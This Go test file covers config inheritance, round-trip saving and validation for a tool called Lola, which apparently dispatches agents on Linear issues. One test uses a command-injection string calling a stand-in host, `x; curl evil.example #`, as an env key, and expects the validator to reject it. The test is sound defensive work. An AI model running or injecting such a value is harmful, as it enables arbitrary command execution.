package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

// writeCfg drops a config.toml into a temp LOLA_HOME and loads it.
func writeCfg(t *testing.T, body string) (*Config, string) {
	t.Helper()
	t.Setenv("LOLA_HOME", t.TempDir())
	path, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	return c, path
}

// A project that omits an inheritable key takes the [defaults] value, and the
// bit records that it was inherited rather than set.
func TestInheritFromDefaults(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]
match_mode = "all"
dedup_mode = "label"
on_sent_set_label = "label-sent"
symlinks = [".env"]
post_create = ["composer install"]
priority_sort = ["createdAt"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	p := c.ProjectByName("web")
	if !reflect.DeepEqual(p.MatchLabels, []string{"label-agent"}) {
		t.Errorf("match_labels = %v, want the [defaults] value", p.MatchLabels)
	}
	if p.MatchMode != "all" || p.DedupMode != "label" || p.OnSentSetLabel != "label-sent" {
		t.Errorf("enums/labels not inherited: %q %q %q", p.MatchMode, p.DedupMode, p.OnSentSetLabel)
	}
	if !reflect.DeepEqual(p.Symlinks, []string{".env"}) || !reflect.DeepEqual(p.PostCreate, []string{"composer install"}) {
		t.Errorf("worktree setup not inherited: %v %v", p.Symlinks, p.PostCreate)
	}
	if !reflect.DeepEqual(p.PrioritySort, []string{"createdAt"}) {
		t.Errorf("priority_sort = %v, want the [defaults] value", p.PrioritySort)
	}
	if !p.Inherits.MatchLabels || !p.Inherits.MatchMode || !p.Inherits.Symlinks {
		t.Errorf("inherited keys must be marked as such: %+v", p.Inherits)
	}
}

// A project-level value wins over [defaults] and is marked as an override.
func TestProjectOverridesDefaults(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]
match_mode = "all"

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
match_labels = ["label-web"]
match_mode = "any"
`)
	p := c.ProjectByName("web")
	if !reflect.DeepEqual(p.MatchLabels, []string{"label-web"}) {
		t.Errorf("match_labels = %v, want the project value", p.MatchLabels)
	}
	if p.MatchMode != "any" {
		t.Errorf("match_mode = %q, want any", p.MatchMode)
	}
	if p.Inherits.MatchLabels || p.Inherits.MatchMode {
		t.Errorf("explicit keys must not be marked inherited: %+v", p.Inherits)
	}
}

// An empty (but present) value is an override to nothing, NOT an inherit —
// the distinction TOML draws between `key = []` and an absent key.
func TestPresentButEmptyOverridesToNothing(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
match_labels = []
`)
	p := c.ProjectByName("web")
	if len(p.MatchLabels) != 0 {
		t.Fatalf("match_labels = %v, want the empty override", p.MatchLabels)
	}
	if p.Inherits.MatchLabels {
		t.Error("an explicit empty value must not be treated as inherit")
	}

	// And it must survive a save/load cycle rather than decay into inherit.
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if q := again.ProjectByName("web"); len(q.MatchLabels) != 0 || q.Inherits.MatchLabels {
		t.Errorf("empty override lost on round trip: %v inherits=%v", q.MatchLabels, q.Inherits.MatchLabels)
	}
}

// Saving must not freeze an inherited value into the file: after a save, a
// change to [defaults] still reaches the project.
func TestInheritedKeysAreNotWrittenBack(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// The key must appear once — under [defaults], not under [[project]].
	if n := strings.Count(string(raw), "match_labels"); n != 1 {
		t.Errorf("match_labels written %d times, want 1 (only [defaults]):\n%s", n, raw)
	}

	// Change the default; the project must follow.
	c.Defaults.MatchLabels = []string{"label-changed"}
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := again.ProjectByName("web").MatchLabels; !reflect.DeepEqual(got, []string{"label-changed"}) {
		t.Errorf("project match_labels = %v, want to track the changed default", got)
	}
}

// Resolution is idempotent: the bitmap, not the stored value, is the source of
// truth, so running it twice cannot drift.
func TestResolveInheritanceIdempotent(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["a", "b"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	first := *c.ProjectByName("web")
	c.ResolveInheritance()
	c.ResolveInheritance()
	if got := *c.ProjectByName("web"); !reflect.DeepEqual(first, got) {
		t.Errorf("resolution drifted:\n first: %+v\n after: %+v", first, got)
	}
}

// A project must not alias the shared [defaults] slice — mutating one project's
// inherited value would otherwise corrupt every other project's.
func TestInheritedSlicesAreCloned(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["a"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-1"
`)
	c.ProjectByName("web").MatchLabels[0] = "mutated"
	if got := c.ProjectByName("api").MatchLabels[0]; got != "a" {
		t.Errorf("sibling project saw %q — the [defaults] slice is aliased", got)
	}
	if got := c.Defaults.MatchLabels[0]; got != "a" {
		t.Errorf("[defaults] itself was mutated to %q", got)
	}
}

// A [defaults] label shared by projects on DIFFERENT teams is accepted.
//
// Lola used to reject this, reasoning that a Linear label UUID is team-scoped.
// That is only true of team labels: Linear also has workspace-level labels
// (IssueLabel.team == null) which exist across every team, and those are
// exactly what a shared [defaults] label should be. The old check therefore
// rejected the correct configuration. Whether a UUID is workspace- or
// team-scoped cannot be known offline, so the settings UIs enforce it by
// offering only workspace labels for the [defaults] keys.
func TestDefaultLabelAcrossTeamsAccepted(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent-ready"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-2"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	if err := c.Validate(); err != nil {
		t.Fatalf("a workspace label shared across teams must validate, got %v", err)
	}
	// Both projects inherit it.
	for _, name := range []string{"web", "api"} {
		p := c.ProjectByName(name)
		if !reflect.DeepEqual(p.MatchLabels, []string{"label-agent-ready"}) {
			t.Errorf("%s match_labels = %v, want the shared default", name, p.MatchLabels)
		}
	}
}

// One team inheriting the default is fine, however many projects share it.
func TestDefaultLabelSingleTeamAccepted(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
match_labels = ["label-agent"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	if err := c.Validate(); err != nil {
		t.Fatalf("one team must validate, got %v", err)
	}
}

// [defaults].env feeds the same shell-sourced file as [[project]].env, so it
// needs the same identifier check — this is a security boundary, not a nicety.
func TestDefaultsEnvKeyValidated(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
`)
	c.Defaults.Env = map[string]string{`x; curl evil.example #`: "y"}
	err := c.Validate()
	if err == nil || !strings.Contains(err.Error(), "not a valid shell identifier") {
		t.Fatalf("want a shell-identifier rejection, got %v", err)
	}
}

// Neither project nor [defaults] set the enums: resolution supplies the hard
// fallbacks rather than leaving a value Validate would reject.
func TestHardFallbacksWhenDefaultsSilent(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
`)
	p := c.ProjectByName("web")
	if p.MatchMode != DefaultMatchMode || p.DedupMode != DefaultDedupMode {
		t.Errorf("match/dedup = %q/%q, want the hard fallbacks", p.MatchMode, p.DedupMode)
	}
	if !reflect.DeepEqual(p.PrioritySort, DefaultPrioritySort) {
		t.Errorf("priority_sort = %v, want %v", p.PrioritySort, DefaultPrioritySort)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("resolved fallbacks must validate, got %v", err)
	}
}

// A priority_sort key the sorter never understood must NOT hard-block the
// daemon. Those keys were already inert — SortIssues ignores anything its
// switch does not match — so Load drops them and records a notice, rather than
// Validate rejecting a config that was working (however unintentionally).
//
// This is the "urgent"/"high" case: read as Linear priority levels, which
// priority_sort has never been.
func TestPrioritySortJunkIsRepairedNotRejected(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
priority_sort = ["urgent", "high"]

[[project]]
name = "okane"
path = "/tmp/okane"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
priority_sort = ["urgent", "priority"]
`)
	if err := c.Validate(); err != nil {
		t.Fatalf("legacy junk must not block the daemon, got %v", err)
	}

	// Known keys survive; unknown ones are gone.
	if got := c.ProjectByName("okane").PrioritySort; !reflect.DeepEqual(got, []string{"priority"}) {
		t.Errorf("project priority_sort = %v, want the known key kept", got)
	}
	if got := c.Defaults.PrioritySort; len(got) != 0 {
		t.Errorf("defaults priority_sort = %v, want emptied", got)
	}

	// The repair is REPORTED, not silent: the effective order really did change.
	notices := c.Notices()
	if len(notices) != 2 {
		t.Fatalf("want a notice per repaired scope, got %v", notices)
	}
	joined := strings.Join(notices, "\n")
	for _, want := range []string{"urgent", "high", "defaults", "okane", "not Linear priorities"} {
		if !strings.Contains(joined, want) {
			t.Errorf("notice must mention %q:\n%s", want, joined)
		}
	}

	// And it round-trips clean: the next load has nothing left to repair.
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if n := again.Notices(); len(n) != 0 {
		t.Errorf("a saved config must be clean, got %v", n)
	}
}

// A value written in memory NOW is still rejected — that is where the check
// earns its keep, since Load has already repaired anything from disk.
func TestPrioritySortJunkFromMemoryStillRejected(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
`)
	c.Defaults.PrioritySort = []string{"urgent"}
	err := c.Validate()
	if err == nil || !strings.Contains(err.Error(), `unknown key "urgent"`) {
		t.Fatalf("want a rejection for a freshly written bad key, got %v", err)
	}
}

// --- Phase 7: per-project review-provider selection (the inheritance bitmap) ---
//
// These mirror the match_labels discipline exactly (see the tests above): the
// `review` key is an inheritable []provKind carried through the pointer mirror
// (nil = inherit vs `review = []` = override to nothing), with an Inherits.Review
// bit whose ZERO value means "explicit". The trap — mutating the resolved field
// without clearing the bit silently discards the write — is exercised too.

// A project that omits `review` takes [defaults].review, and the bit records it.
func TestReviewInheritedFromDefaults(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
review = ["coderabbit-cli", "claude-session"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	p := c.ProjectByName("web")
	if !p.Inherits.Review {
		t.Error("an omitted review key must be marked inherited")
	}
	if !reflect.DeepEqual(p.Review, []provKind{provCoderabbitCLI, provClaudeSession}) {
		t.Errorf("review = %v, want the [defaults] value", p.Review)
	}
}

// A present-but-empty `review = []` is an override to nothing, NOT an inherit,
// and survives a save/load cycle rather than decaying into inherit.
func TestReviewPresentButEmptyOverridesToNothing(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
review = ["coderabbit-cli"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
review = []
`)
	p := c.ProjectByName("web")
	if p.Inherits.Review {
		t.Error("an explicit empty review must not be treated as inherit")
	}
	if p.Review == nil || len(p.Review) != 0 {
		t.Fatalf("review = %v, want the empty override (non-nil, len 0)", p.Review)
	}

	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if q := again.ProjectByName("web"); q.Inherits.Review || q.Review == nil || len(q.Review) != 0 {
		t.Errorf("empty review override lost on round trip: %v inherits=%v", q.Review, q.Inherits.Review)
	}
}

// The bitmap ZERO value means "fully explicit": a hand-built Project literal
// with a non-nil Review and a zero Inherits writes `review` under [[project]]
// and never decays to inherit — matching how MatchLabels behaves.
func TestReviewBitmapZeroValueIsExplicit(t *testing.T) {
	t.Setenv("LOLA_HOME", t.TempDir())
	path, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	c := &Config{
		Defaults: Defaults{GlobalCap: 4, ConcurrencyCap: 1, Review: []provKind{provCoderabbitCLI}},
		Projects: []Project{{
			Name:   "web",
			Path:   "/tmp/web",
			Review: []provKind{provClaudeSession},
			// Inherits is the zero value: a construction site that never sets a
			// bit means "every key explicit", so review must be written.
		}},
	}
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// Once under [defaults], once as the explicit [[project]] override. Match the
	// key assignment ("review = [") specifically — the reactions default message
	// also contains the word "review".
	if n := strings.Count(string(raw), "review = ["); n != 2 {
		t.Errorf("review written %d times, want 2 ([defaults] + explicit [[project]]):\n%s", n, raw)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	q := again.ProjectByName("web")
	if q.Inherits.Review {
		t.Error("an explicit project review must not decay to inherit on load")
	}
	if !reflect.DeepEqual(q.Review, []provKind{provClaudeSession}) {
		t.Errorf("review = %v, want the explicit project value", q.Review)
	}
}

// Saving must not freeze an inherited review into the file: after a save, a
// change to [defaults].review still reaches the project.
func TestReviewInheritedKeysAreNotWrittenBack(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
review = ["coderabbit-cli"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// review must appear once — under [defaults], not under [[project]]. Match
	// the key assignment specifically (the reactions default message also
	// contains the word "review").
	if n := strings.Count(string(raw), "review = ["); n != 1 {
		t.Errorf("review written %d times, want 1 (only [defaults]):\n%s", n, raw)
	}

	c.Defaults.Review = []provKind{provClaudeSession}
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got := again.ProjectByName("web").Review; !reflect.DeepEqual(got, []provKind{provClaudeSession}) {
		t.Errorf("project review = %v, want to track the changed default", got)
	}
}

// The trap: mutating the resolved Review field WITHOUT clearing Inherits.Review
// silently discards the write on Save — projectToFile omits the key while the
// bit is set. The project must reload as still-inherited, holding the [defaults]
// value, never the stray override.
func TestReviewMutateWithoutClearingBitIsDiscarded(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
review = ["coderabbit-cli"]

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
`)
	p := c.ProjectByName("web")
	if !p.Inherits.Review {
		t.Fatal("precondition: the project should inherit review")
	}
	// Mutate the resolved field but leave the inherit bit set — the trap.
	p.Review = []provKind{provClaudeSession}
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	q := again.ProjectByName("web")
	if !q.Inherits.Review {
		t.Error("a write that never cleared the inherit bit must not persist as an override")
	}
	if !reflect.DeepEqual(q.Review, []provKind{provCoderabbitCLI}) {
		t.Errorf("review = %v, want the inherited [defaults] value (the stray write must be discarded)", q.Review)
	}
}

// ResolveInheritance is idempotent for review, and an explicit override (a list,
// or an empty override-to-nothing) survives a Load -> Save -> Load identity.
func TestReviewResolveInheritanceRoundTripIdentity(t *testing.T) {
	c, path := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
review = ["coderabbit-cli", "claude-session"]

[[project]]
name = "api"
path = "/tmp/api"
team_id = "team-1"
review = []
`)
	first := *c.ProjectByName("web")
	c.ResolveInheritance()
	c.ResolveInheritance()
	if got := *c.ProjectByName("web"); !reflect.DeepEqual(first, got) {
		t.Errorf("review resolution drifted:\n first: %+v\n after: %+v", first, got)
	}

	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	again, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"web", "api"} {
		a, b := c.ProjectByName(name), again.ProjectByName(name)
		if !reflect.DeepEqual(a.Review, b.Review) || a.Inherits.Review != b.Inherits.Review {
			t.Errorf("%s review round-trip drift: %v/inherit=%v -> %v/inherit=%v",
				name, a.Review, a.Inherits.Review, b.Review, b.Inherits.Review)
		}
	}
}

// A project's per-project review selection must name a kind that is an enabled
// provider in the effective catalog; an unavailable kind is rejected, an enabled
// one validates.
func TestProjectReviewValidatedAgainstCatalog(t *testing.T) {
	bad, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[review.provider]]
provider = "coderabbit-cli"
enabled = true

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
review = ["claude-session"]
`)
	if err := bad.Validate(); err == nil || !strings.Contains(err.Error(), "enabled provider in the catalog") {
		t.Fatalf("want a catalog-membership rejection for an unlisted kind, got %v", err)
	}

	good, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2

[[review.provider]]
provider = "coderabbit-cli"
enabled = true

[[project]]
name = "web"
path = "/tmp/web"
team_id = "team-1"
cycle_mode = "none"
assignee_mode = "anyone"
review = ["coderabbit-cli"]
`)
	if err := good.Validate(); err != nil {
		t.Fatalf("selecting an enabled catalog kind must validate, got %v", err)
	}
}

// A clean config reports nothing.
func TestNoNoticesOnCleanConfig(t *testing.T) {
	c, _ := writeCfg(t, `
[defaults]
global_cap = 4
concurrency_cap = 2
priority_sort = ["priority", "createdAt"]
`)
	if n := c.Notices(); len(n) != 0 {
		t.Errorf("clean config must report no repairs, got %v", n)
	}
}
